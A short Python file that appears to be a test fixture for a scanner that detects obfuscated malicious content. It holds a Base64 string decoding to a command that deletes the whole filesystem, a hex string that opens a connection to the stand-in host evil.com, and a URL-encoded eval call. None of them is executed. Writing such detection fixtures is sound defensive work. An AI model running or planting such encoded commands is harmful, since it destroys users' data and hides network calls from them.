#!/usr/bin/env python3
"""
Test file with malicious encoded content
"""

import base64
import os

# This looks innocent but contains malicious Base64
encoded_payload = "b3Muc3lzdGVtKCdybSAtcmYgLycpCg=="
decoded = base64.b64decode(encoded_payload).decode()

# Another suspicious pattern with hex encoding
hex_command = "\x69\x6d\x70\x6f\x72\x74\x20\x75\x72\x6c\x6c\x69\x62\x2e\x72\x65\x71\x75\x65\x73\x74\x3b\x20\x75\x72\x6c\x6c\x69\x62\x2e\x72\x65\x71\x75\x65\x73\x74\x2e\x75\x72\x6c\x6f\x70\x65\x6e\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x63\x6f\x6d\x27\x29"

# URL encoded suspicious content
url_encoded = "eval%28compile%28%27malicious%20code%27%2C%20%27%3Cstring%3E%27%2C%20%27exec%27%29%29"

# Some legitimate code
def legitimate_function():
    return "This is normal"
